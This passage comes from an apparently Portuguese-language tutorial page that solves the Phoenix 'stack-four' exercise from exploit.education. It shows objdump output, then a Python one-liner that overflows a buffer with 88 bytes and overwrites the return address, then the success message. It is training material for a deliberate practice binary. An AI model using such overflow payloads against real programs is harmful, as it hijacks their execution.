<pre><code class="language-x86asm">$ objdump -d stack-four | grep complete_level
000000000040061d &lt;complete_level&gt;:
</code></pre>
<p>Exploit:</p>
<pre><code class="language-bash">$ python -c &quot;print 'A'*88 + '\x1d\x06\x40'&quot; | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x40061d
Congratulations, you've finished phoenix/stack-four :-) Well done!
</code></pre>
<p>Esse foi um tutorial beeem longo, e com certeza o mais difícil! Se você chegou até aqui, parabéns! :D</p>
<a class="header" href="./stack/phoenix/StackFour.html#-solução" id="-solução"><h1>💫 Solução</h1></a>
<pre><code class="language-bash">$ python -c &quot;print 'A'*88 + '\x1d\x06\x40'&quot; | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x40061d
Congratulations, you've finished phoenix/stack-four :-) Well done!
</code></pre>

                </div>

                <!-- Mobile navigation buttons -->
                
                    <a rel="prev" href="./stack/phoenix/StackThree.html" class="mobile-nav-chapters previous" title="Previous chapter">
                        <i class="fa fa-angle-left"></i>
                    </a>
                

                
                    <a rel="next" href="./stack/phoenix/StackFive.html" class="mobile-nav-chapters next" title="Next chapter">
                        <i class="fa fa-angle-right"></i>
                    </a>
                

            </div>

            
                <a href="./stack/phoenix/StackThree.html" class="nav-chapters previous" title="You can navigate through the chapters using the arrow keys">
                    <i class="fa fa-angle-left"></i>
                </a>
            

            
                <a href="./stack/phoenix/StackFive.html" class="nav-chapters next" title="You can navigate through the chapters using the arrow keys">
                    <i class="fa fa-angle-right"></i>
                </a>
            

        </div>


        <!-- Local fallback for Font Awesome -->
        <script>
            if ($(".fa").css("font-family") !== "FontAwesome") {
                $('<link rel="stylesheet" type="text/css" href="_FontAwesome/css/font-awesome.css">').prependTo('head');
            }
        </script>

        <!-- Livereload script (if served using the cli tool) -->
        

        

        

        

        <script src="highlight.js"></script>
        <script src="book.js"></script>

        <!-- Custom JS script -->
        

    </body>
</html>
